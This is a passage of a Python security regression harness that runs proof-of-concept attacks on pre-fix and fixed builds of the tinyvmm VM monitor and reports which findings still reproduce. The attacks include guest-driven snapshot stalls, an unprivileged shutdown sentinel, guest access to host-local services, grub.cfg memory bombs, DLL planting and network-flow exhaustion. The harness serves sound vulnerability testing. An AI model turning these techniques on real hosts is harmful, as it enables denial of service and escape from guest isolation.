# tinyvmm gives the disk work a guest has queued 15 s once the guest asks for
# its snapshot. A VMM still at it this long after the trigger is held up.
BLK_SNAPSHOT_LIMIT_S = 25.0
BLK_SNAPSHOT_KILL_S = 45.0


def _blk_snapshot(ctx: Ctx, exe: Path, tag: str, seg_bytes: int,
                  requests: int) -> tuple[bool | None, bool, str]:
    """--save: the guest queues `requests` reads of 250 segments of
    `seg_bytes` each (one guest buffer) and asks for its snapshot 0.2 s
    later. Returns (held up?, snapshot written and exit 0?, what happened);
    held up is None if the run could not be judged."""
    disk = _make_vhdx(ctx, exe, f"{tag}.vhdx", "256G")
    snap = ctx.workdir / f"{tag}.snap"
    try:
        # --save takes a drive only read-only (the PoC only reads).
        run = ctx.vm(exe, tag, ["--drive", f"{disk},readonly", "--save", str(snap)],
                     "blk-whole-disk-stop",
                     {"gpa": hex(GIB), "seglen": seg_bytes, "nsegs": BLK_SEGS,
                      "nreq": requests, "settle_ms": 0, "snapshot": 1},
                     kernel_args=["mem=1024M"], ram_mb=1024 + 1024 + 512, watchdog=200,
                     hard_timeout=BLK_SNAPSHOT_KILL_S + 10)
        written = snap.exists()
        partial = [p.name for p in ctx.workdir.glob(snap.name + ".*")]
    finally:
        disk.unlink(missing_ok=True)
        for p in ctx.workdir.glob(snap.name + "*"):
            p.unlink(missing_ok=True)
    kick = run.mark("blk-kick")
    trigger = run.find("[snapshot] trigger fired")
    if not kick or not trigger:
        errs = run.guest_errors()
        return None, False, ((f"guest error: {errs[0]}" if errs else "no snapshot trigger")
                             + f" ({run.log_path})")
    took = run.t_exit - trigger[0]
    said = next((l[2].strip() for l in run.lines
                 if l[0] >= trigger[0] and "trigger fired" not in l[2]
                 and ("error" in l[2].lower() or "WARN" in l[2])), "")
    what = (f"{requests} reads of {kick[2].get('total_mib')} MiB each queued, then the "
            "snapshot trigger; from the trigger to the VMM's exit: "
            + (f"over {took:.0f} s (killed)" if run.killed else f"{took:.1f} s")
            + f", exit code {run.exit_code}, snapshot "
            + ("written" if written else "not written")
            + (f" (left behind: {', '.join(partial)})" if partial else "")
            + (f"; VMM said: {said[:170]}" if said else ""))
    return (run.killed or took > BLK_SNAPSHOT_LIMIT_S,
            written and run.exit_code == 0 and not run.killed, what)


def poc_blk_snapshot_wait(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """--save: the guest queues eight reads of 250 x 1 GiB (one guest buffer)
    and then asks for its snapshot, which wants the guest's queued disk work
    done first: for how long does the guest get to keep the VMM? Then the
    same with two reads of 250 x 128 MiB, a few seconds of work: that
    snapshot has to be written."""
    held, _, hostile = _blk_snapshot(ctx, exe, f"blk-snapshot-{which}", GIB,
                                     BLK_SNAPSHOT_REQUESTS)
    if held is None:
        return Outcome(None, "", hostile)
    _, written, modest = _blk_snapshot(ctx, exe, f"blk-snapshot-modest-{which}", 128 * MIB, 2)
    ev = f"{hostile}; with work it can finish: {modest}"
    if not written and which == "fixed":
        return Outcome(None, ev, "a snapshot with a few seconds of disk work queued "
                                 "was not written")
    return Outcome(held, ev)


def poc_bar_remap(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """Functional: 300 COMMAND.memory toggles on a virtio-blk device with I/O
    through the kernel driver after each, then the BAR moved away and back."""
    disk = _make_vhdx(ctx, exe, f"small-{which}.vhdx", "64")
    try:
        run = ctx.vm(exe, f"bar-remap-{which}", ["--drive", str(disk)], "bar-remap",
                     {"iters": 300}, watchdog=90)
    finally:
        disk.unlink(missing_ok=True)
    r = run.result("bar-remap")
    if not r:
        if run.killed:
            return Outcome(True, f"the VM hung; {_stop_story(run)}")
        return _no_result(run, "result")
    bad = _i(r, "io_failed") + _i(r, "io_after_move_failed")
    clean = not run.killed and run.exit_code == 0
    ev = (f"{_i(r, 'toggles')} unmap/remap cycles: I/O ok {_i(r, 'io_ok')}, failed "
          f"{_i(r, 'io_failed')}; BAR {r.get('bar_was')} -> {r.get('bar_moved_to')} -> "
          f"{r.get('bar_back')}: I/O ok {_i(r, 'io_after_move_ok')}, failed "
          f"{_i(r, 'io_after_move_failed')}; "
          + (f"clean exit in {run.wall:.1f} s" if clean
             else f"exit code {run.exit_code}, killed={run.killed}"))
    return Outcome(bad > 0 or not clean, ev)


def poc_sentinel_unprivileged(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """uid 65534 gets the shutdown sentinel onto hvc0: by writing it to a
    console it has open, and by making the kernel log it (a crashing program
    whose file is named after it)."""
    parts = []
    vulnerable = False
    for mode in ("stdout", "segv"):
        run = ctx.vm(exe, f"sentinel-{mode}-{which}", ["--no-doorbells"], "sentinel",
                     {"mode": mode}, watchdog=30)
        child = run.find("[poc] sentinel-child uid=65534")
        sent = run.find(SENTINEL)
        alive = run.result("sentinel")
        if not child or not sent:
            return _no_result(run, f"sentinel on hvc0 (mode {mode})")
        via = "written to the console" if mode == "stdout" else "in a kernel segfault message"
        if alive and run.find("the guest powered off"):
            parts.append(f"{via}: ignored, guest ran on and powered off by itself "
                         f"{run.t_exit - sent[0]:.1f} s later")
        else:
            vulnerable = True
            parts.append(f"{via}: VM stopped {(run.t_exit - sent[0]) * 1000:.0f} ms later, "
                         f"guest never got to its next line")
    return Outcome(vulnerable, "sentinel from uid 65534 " + "; ".join(parts))


class TokenServer:
    """A TCP server on an ephemeral port that answers every connection with
    a token, and counts them."""

    def __init__(self, bind_ip: str) -> None:
        self.token = secrets.token_hex(8)
        self.connections = 0
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((bind_ip, 0))
        self.sock.listen(16)
        self.ip, self.port = self.sock.getsockname()
        threading.Thread(target=self._serve, daemon=True).start()

    def _serve(self) -> None:
        while True:
            try:
                conn, _ = self.sock.accept()
            except OSError:
                return
            self.connections += 1
            try:
                conn.settimeout(3)
                conn.recv(1024)
                body = self.token.encode()
                conn.sendall(b"HTTP/1.0 200 OK\r\nContent-Length: %d\r\n\r\n%s" % (len(body), body))
            except OSError:
                pass
            finally:
                conn.close()

    def close(self) -> None:
        self.sock.close()


def _host_own_ipv4() -> str | None:
    """The address the host would send from to reach other networks: one of
    its own. connect() on a UDP socket picks the route; nothing is sent."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("192.0.2.1", 9))  # TEST-NET-1: an address nobody has
        ip = s.getsockname()[0]
    except OSError:
        return None
    finally:
        s.close()
    return None if ip.startswith(("127.", "169.254.", "0.")) else ip


def _backend_dll(exe: Path, env_name: str, sub: str, dll: str) -> dict[str, str] | None:
    """Environment that lets `exe` find a network backend's DLL, or None if
    there is none: already named by the environment, next to the binary, or
    in the shared work directory."""
    if os.environ.get(env_name) and Path(os.environ[env_name]).exists():
        return {}
    if (exe.parent / dll).exists():
        return {}
    shared = TEMP / "tinyvmm-work" / sub / dll
    return {env_name: str(shared)} if shared.exists() else None


GATEWAY_IP = "172.29.255.1"


def poc_net_host_local(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """Without --nat-host-local the guest fetches a token from a server on one
    of the host's own addresses (nat backend), and from one on the host's
    127.0.0.1 through the gateway address (slirp and gvisor backends, when
    their DLLs are at hand)."""
    cases: list[tuple[str, str, str, str, dict[str, str] | None]] = []
    own = _host_own_ipv4()
    if own:
        cases.append(("nat", "one of the host's own addresses", own, own, {}))
    for backend, env_name, sub, dll in (("slirp", "TINYVMM_LIBSLIRP", "slirp", "libslirp-0.dll"),
                                        ("gvisor", "TINYVMM_GVISOR", "gvisor",
                                         "tinyvmm_gvisor.dll")):
        cases.append((backend, "the host's 127.0.0.1 (as the gateway)", "127.0.0.1", GATEWAY_IP,
                      _backend_dll(exe, env_name, sub, dll)))
    parts = []
    vulnerable = False
    ran = 0
    for backend, what, bind_ip, target, env in cases:
        if env is None:
            parts.append(f"{backend}: skipped (its DLL was not found)")
            continue
        try:
            server = TokenServer(bind_ip)
        except OSError as e:
            parts.append(f"{backend}: skipped (cannot listen on {bind_ip}: {e})")
            continue
        try:
            run = ctx.vm(exe, f"net-host-local-{backend}-{which}",
                         ["--net", "--net-backend", backend, "--no-doorbells"], "net-reach",
                         {"ip": target, "port": server.port}, watchdog=40, env=env)
        finally:
            server.close()
        r = run.result("net-reach")
        if not r:
            return _no_result(run, f"result ({backend} backend)")
        ran += 1
        got = r.get("token") == server.token
        if got or server.connections:
            vulnerable = True
            parts.append(f"{backend}: guest reached {what}, port {server.port}: token "
                         f"{'read' if got else 'not read'}, {server.connections} connection(s) "
                         f"seen by the host's server")
        else:
            parts.append(f"{backend}: {what}, port {server.port}: refused (guest errno "
                         f"{_i(r, 'errno')} after {_f(r, 'ms'):.0f} ms), 0 connections seen")
    if not ran:
        return Outcome(None, "", "no case could run: " + "; ".join(parts))
    return Outcome(vulnerable, "; ".join(parts))


# ------------------------------------------------------------------ host-side PoCs
# No hostile driver in the guest: see poc/host/.


def _host_poc(res: dict) -> Outcome:
    if res.get("skipped"):
        return Outcome(None, "", res["evidence"], skipped=True)
    if res["vulnerable"] is None:
        return Outcome(None, "", res["evidence"])
    return Outcome(res["vulnerable"], res["evidence"])


def _zig() -> str | None:
    try:
        return guest_build.find_zig()
    except SystemExit:
        return None


def poc_grub_iso_bomb(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """--iso with a grub.cfg whose variable grows sixteenfold per line, and
    one that names a 32 MiB initrd 64 times; under a 6 GiB commit cap."""
    return _host_poc(grub_bomb.run(exe, ctx.workdir / f"grub-iso-{which}"))


def poc_dll_plant(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """A marker DLL under each backend DLL's name in the directory tinyvmm is
    started from (a private copy of the binary, with no DLL beside it)."""
    return _host_poc(dll_plant.run(exe, ctx.workdir / f"dll-plant-{which}", _zig()))


def poc_snapshot_clobber(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """A second --save to the path of a good snapshot, killed while it is
    writing."""
    return _host_poc(snapshot_clobber.run(exe, ctx.workdir / f"snapshot-clobber-{which}"))


def poc_console_input_memory(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """512 MiB piped into tinyvmm's stdin for a guest that never reads hvc0."""
    return _host_poc(console_input_memory.run(exe, ctx.workdir / f"console-input-{which}"))


GVISOR_DLL = "tinyvmm_gvisor.dll"


def _gvisor_shim(exe: Path, which: str) -> Path | None:
    """The gVisor shim to judge with this build. The bounds are in the DLL:
    the pre-fix one is named by TINYVMM_GVISOR_BASELINE or is
    tinyvmm_gvisor_baseline.dll in the shared work directory; the fixed one is
    found as tinyvmm finds it, or there."""
    shared = TEMP / "tinyvmm-work" / "gvisor"
    if which == "baseline":
        candidates = [os.environ.get("TINYVMM_GVISOR_BASELINE"),
                      shared / "tinyvmm_gvisor_baseline.dll"]
    else:
        candidates = [os.environ.get("TINYVMM_GVISOR"), exe.parent / GVISOR_DLL,
                      shared / GVISOR_DLL]
    return next((Path(c) for c in candidates if c and Path(c).exists()), None)


def poc_gvisor_flow_bomb(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """--net-backend gvisor: the guest opens 20,000 UDP flows, then 12,000 TCP
    connections to a host server, and holds them; under a 12 GiB commit cap."""
    shim = _gvisor_shim(exe, which)
    if shim is None:
        return Outcome(None, "", f"no {'pre-fix ' if which == 'baseline' else ''}gVisor shim "
                                 "at hand (see README.md)", skipped=True)
    return _host_poc(gvisor_flow_bomb.run(exe, shim, ctx.workdir / f"gvisor-flows-{which}",
                                          _zig()))


# The eleven PoCs of the review, then the extras (see README.md).
POCS: list[tuple[str, Callable[[Ctx, Path, str], Outcome], str]] = [
    ("avail-bomb", poc_avail_bomb, "finding 2: avail.idx 65535 ahead -> 65535 chains per kick"),
    ("console-flood", poc_console_flood, "finding 2: console TX chain of any size to stdout"),
    ("input-status-bomb", poc_input_status_bomb,
     "finding 2: statusq chain decoded 8 bytes at a time on the vCPU"),
    ("gpu-backing", poc_gpu_backing,
     "findings 2+10: unbounded backing lists, quadratic transfer"),
    ("net-reset-deadlock", poc_net_reset_deadlock,
     "finding 5: TX pump vs reset lock-order deadlock"),
    ("p9-flush-order", poc_p9_flush_order, "finding 8: Rflush ahead of the flushed reply"),
    ("p9-reset", poc_p9_reset, "finding 13: reset keeps the old ring position"),
    ("p9-fid-memory", poc_p9_fid_memory, "finding 10: fid paths without a budget"),
    ("blk-whole-disk-stop", poc_blk_whole_disk_stop,
     "teardown bound: a whole-disk read holds the stop"),
    ("bar-remap", poc_bar_remap, "finding 1's fix, functional: BAR unmap/remap/move"),
    ("sentinel-unprivileged", poc_sentinel_unprivileged,
     "finding 7: shutdown sentinel honoured from anyone"),
    ("blk-stop-variants", poc_blk_stop_variants,
     "extra, teardown bound: the same read queued twice, and without doorbells"),
    ("blk-snapshot-wait", poc_blk_snapshot_wait,
     "extra, snapshot bound: --save waits for whatever disk work the guest queued"),
    ("p9-flush-stress", poc_p9_flush_stress,
     "extra, findings 8+13 functional: Tflush storms with resets mid-flight"),
    ("net-host-local", poc_net_host_local,
     "extra (net/filter.rs, nat.rs host_dest): host-local services reachable from the guest"),
    ("grub-var-bomb", poc_grub_var_bomb,
     "extra (convenience/grub_cfg.rs): a self-doubling grub.cfg variable on the guest's disk"),
    ("grub-iso-bomb", poc_grub_iso_bomb,
     "host-side, finding 6: an ISO's grub.cfg grows a variable, or names one initrd 64 times"),
    ("dll-plant", poc_dll_plant,
     "host-side, finding 12: a backend DLL in the current directory runs inside tinyvmm"),
    ("snapshot-clobber", poc_snapshot_clobber,
     "host-side, finding 14: an interrupted --save destroys the snapshot at its path"),
    ("console-input-memory", poc_console_input_memory,
     "host-side, finding 10: input for a guest that isn't reading is held without bound"),
    ("gvisor-flow-bomb", poc_gvisor_flow_bomb,
     "host-side, finding 10: flows through the gVisor shim pin host memory and sockets"),
]
HOST_SIDE = {"grub-iso-bomb", "dll-plant", "snapshot-clobber", "console-input-memory",
             "gvisor-flow-bomb"}
EXTRAS = {"blk-stop-variants", "blk-snapshot-wait", "p9-flush-stress", "net-host-local",
          "grub-var-bomb"} | HOST_SIDE
# Expected to pass on the pre-fix build too.
FUNCTIONAL_ONLY = {"bar-remap"}


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--baseline", type=Path, default=None,
                    help=f"vulnerable build (default {DEFAULT_BASELINE})")
    ap.add_argument("--fixed", type=Path, default=None,
                    help=f"fixed build (default {DEFAULT_FIXED}, else {FALLBACK_FIXED})")
    ap.add_argument("--only", default="", help="comma-separated PoC names to run")
    ap.add_argument("--skip-gpu", action="store_true",
                    help="skip gpu-backing (it opens a window on the desktop)")
    ap.add_argument("--no-extras", action="store_true",
                    help="run only the review's eleven PoCs, not: " + ", ".join(sorted(EXTRAS)))
    ap.add_argument("--no-baseline", action="store_true", help="run the fixed build only")
    ap.add_argument("--keep", action="store_true", help="keep the work directory's fixtures")
    ap.add_argument("--verbose", action="store_true", help="echo each VM's output")
    ap.add_argument("--list", action="store_true", help="list the PoCs and exit")
    args = ap.parse_args()

    if args.list:
        for name, _, what in POCS:
            print(f"{name:24} {what}")
        return 0

    fixed = args.fixed or (DEFAULT_FIXED if DEFAULT_FIXED.exists() else FALLBACK_FIXED)
    baseline = None if args.no_baseline else (args.baseline or DEFAULT_BASELINE)
    if not fixed.exists():
        print(f"error: fixed tinyvmm not found at {fixed}", file=sys.stderr)
        return 2
    if baseline is not None and not baseline.exists():
        if args.baseline:
            print(f"error: baseline tinyvmm not found at {baseline}", file=sys.stderr)
            return 2
        print(f"note: no baseline build at {baseline}; running the fixed build only")
        baseline = None
    if not VMLINUX.exists():
        print(f"error: guest kernel not found at {VMLINUX}", file=sys.stderr)
        return 2

    only = [n for n in args.only.split(",") if n]
    known = [name for name, _, _ in POCS]
    for n in only:
        if n not in known:
            print(f"error: unknown PoC '{n}' (have: {', '.join(known)})", file=sys.stderr)
            return 2
    selected = [p for p in POCS if (not only or p[0] in only)
                and not (args.skip_gpu and p[0] == "gpu-backing")
                and not (args.no_extras and not only and p[0] in EXTRAS)]

    initrd = guest_build.build(quiet=True)
    workdir = Path(tempfile.mkdtemp(prefix="tinyvmm-poc-", dir=TEMP))
    ctx = Ctx(workdir, initrd, args.verbose)
    builds = ([("baseline", baseline)] if baseline else []) + [("fixed", fixed)]
    print(f"work directory (VM logs): {workdir}")
    for which, exe in builds:
        print(f"{which:>9}: {exe}")
    print()

    rows: list[tuple[str, str, Outcome]] = []
    fixed_vulnerable = errors = 0
    try:
        for name, fn, what in selected:
            print(f"== {name}: {what}")
            for which, exe in builds:
                t0 = time.monotonic()
                try:
                    out = fn(ctx, exe, which)
                except Unkillable:
                    raise
                except Exception as e:  # noqa: BLE001 - a PoC that cannot run is an error
                    out = Outcome(None, "", f"{type(e).__name__}: {e}")
                took = time.monotonic() - t0
                if out.skipped:
                    verdict = "SKIPPED"
                elif out.vulnerable is None:
                    verdict = "ERROR"
                    errors += 1
                elif out.vulnerable:
                    verdict = "VULNERABLE"
                    fixed_vulnerable += which == "fixed"
                else:
                    verdict = "NOT VULNERABLE"
                detail = out.error if out.vulnerable is None else out.evidence
                if out.vulnerable is None and out.evidence:
                    detail = f"{out.error}; {out.evidence}"
                print(f"   {which:>8}: {verdict:<14} {detail}  [{took:.0f} s]")
                rows.append((name, which, out))
            print()
    except Unkillable as e:
        print(f"\nFATAL: {e}", file=sys.stderr)
        return 3
    finally:
        deep = ctx._fixtures.get("share-deep")
        if deep:
            _remove_deep_share(deep)  # paths too long for rmtree
        if not args.keep:
            for p in workdir.iterdir():
                if p.is_dir():
                    shutil.rmtree(p, ignore_errors=True)
                elif p.suffix != ".log":
                    p.unlink(missing_ok=True)

    print("summary:")
    for name, _, _ in selected:
        cells = []
        for which, _ in builds:
            out = next(o for n, w, o in rows if n == name and w == which)
            cells.append(f"{which}=" + ("skipped" if out.skipped
                                        else "ERROR" if out.vulnerable is None
                                        else "VULNERABLE" if out.vulnerable
                                        else "not vulnerable"))
        print(f"  {name:24} " + "  ".join(cells))
    if baseline:
        missed = [n for n, w, o in rows if w == "baseline" and o.vulnerable is False
                  and n not in FUNCTIONAL_ONLY]
        if missed:
            print(f"note: not reproduced on the baseline build: {', '.join(missed)}")
    print(f"logs: {workdir}")
    if fixed_vulnerable or errors:
        still = [n for n, w, o in rows if w == "fixed" and o.vulnerable]
        print(f"FAIL: fixed build vulnerable to {fixed_vulnerable} PoC(s)"
              + (f" ({', '.join(still)})" if still else "") + f", {errors} error(s)")
        return 1
    print("OK: the fixed build is not vulnerable to any PoC run")
    return 0


if __name__ == "__main__":
    sys.exit(main())
